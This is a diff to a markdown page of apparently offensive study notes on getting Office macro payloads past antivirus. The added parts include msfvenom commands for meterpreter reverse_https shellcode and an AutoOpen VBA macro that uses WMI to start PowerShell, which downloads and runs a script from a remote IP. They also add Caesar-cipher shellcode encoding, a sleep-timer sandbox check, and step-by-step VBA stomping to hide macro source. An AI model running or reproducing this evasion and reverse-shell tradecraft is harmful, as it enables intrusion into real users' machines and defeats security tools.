@@ -10,6 +10,25 @@ nav_order: 1
 [Original Shellcode](#original-shellcode)
 [Original VBA Code](#original-vba-code)
 
+## Powershell Inside VBA ##
+
+
+1. Must use 64 bit for the Powershell shellcode runner:
+`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=PORT EXITFUNC=thread -f vbapplication`
+
+2. Avoid using Shell function:
+```
+Sub MyMacro
+  strArg = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/run.txt'))"
+  GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
+End Sub
+
+Sub AutoOpen()
+    Mymacro
+End Sub
+```
+
+
 ## Encrypting C# Shellcode with Caesar cipher ##
 
 1. Generate a C# shellcode:
@@ -58,7 +77,7 @@ for(int i = 0; i < buf.Length; i++)
 1. Generate a C# shellcode:
 `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=PORT EXITFUNC=thread -f csharp`
 
-2. Refer to the [original C# Shellcode](#original-shellcode), or can also combine it with the Caesar cipher.
+2. Refer to the [original C# Shellcode](#original-shellcode), and can also combine it with the Caesar cipher.
 
 3. Insert the following code:
 
@@ -82,7 +101,7 @@ static void Main(string[] args)
 1. Generate a C# shellcode:
 `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=PORT EXITFUNC=thread -f csharp`
 
-2. Refer to the [original C# Shellcode](#original-shellcode), or can also combine it with the Caesar cipher.
+2. Refer to the [original C# Shellcode](#original-shellcode), and can also combine it with the Caesar cipher.
 
 3. Insert the following code:
 
@@ -102,8 +121,28 @@ if(mem == null)
 {
     return;
 }
-
 ```
+
+## VBA Stomping ##
+
+1. FlexHEX -> File -> Open -> OLE Compound File...
+
+2. Lower left Navigation pane -> Macro -> PROJECT. Click on this.
+
+3. Upper left window got ASCII line "Module=NewMacro" (4D 6F 64 75 6C 65...). Highlight this (include all the end spaces but not the beginning spaces).
+
+4. Edit -> Insert Zero Block. Ok and save it.
+
+5. Lower left Navigation pane -> Macro -> VBA -> NewMacros. Click on this.
+
+6. Upper left window got ASCII line "Attribute VB_Name"(41 74 74 72 69 62...). Highlight this until the entire end.
+
+7. Edit -> Insert Zero Block. Ok and save it.
+
+8. Can also use Evil Clippy to automate the process.
+
+Note: VBA Stomping does not work for files saved in the Excel 97-2003 Workbook (.xls) format
+
 
 # Ineffective Methods
 [Effective Methods](#effective-methods)
@@ -133,7 +172,80 @@ if(mem == null)
 `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 --encrypt aes256 --encrypt-key fdgdgj93jf43uj983uf498f43 -f exe -o /tmp/met64_aes.exe`
 
 
-## Caesar Cipher  ##
+## Caesar Cipher on VBA ##
+
+1. Generate a VBA shellcode:
+`msfvenom -p windows/meterpreter/reverse_https LHOST=IP LPORT=PORT EXITFUNC=thread -f vbapplication`
+
+2. Create a new Helper program with our generated shellcode:
+
+```
+namespace Helper
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            byte[] buf = new byte[752] {}
+                
+            byte[] encoded = new byte[buf.Length];
+            for(int i = 0; i < buf.Length; i++)
+            {
+                encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
+            }
+
+            uint counter = 0;
+
+            StringBuilder hex = new StringBuilder(encoded.Length * 2);
+            foreach(byte b in encoded)
+            {
+                hex.AppendFormat("{0:D}, ", b);
+                counter++;
+                if(counter % 50 == 0)
+                {
+                    hex.AppendFormat("_{0}", Environment.NewLine);
+                }
+            }
+
+            Console.WriteLine("The payload is: " + hex.ToString());
+        }
+    }
+}
+```
+
+3. Refer to the [original VBA Code](#original-vba-code). Add the following code under the shellcode:
+
+```
+For i = 0 To UBound(buf)
+    buf(i) = buf(i) - 2
+Next i
+```
+
+## Sleep Timer on VBA ##
+
+1. Generate a VBA shellcode:
+`msfvenom -p windows/meterpreter/reverse_https LHOST=IP LPORT=PORT EXITFUNC=thread -f vbapplication`
+
+2. Refer to the [original VBA Code](#original-vba-code), and can also combine it with the Caesar cipher.
+
+```
+Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long
+...
+Dim t1 As Date
+Dim t2 As Date
+Dim time As Long
+
+t1 = Now()
+Sleep (2000)
+t2 = Now()
+time = DateDiff("s", t1, t2)
+
+If time < 2 Then
+    Exit Function
+End If
+...
+```
+
 
 # Original Shellcode
 [Effective Methods](#effective-methods)
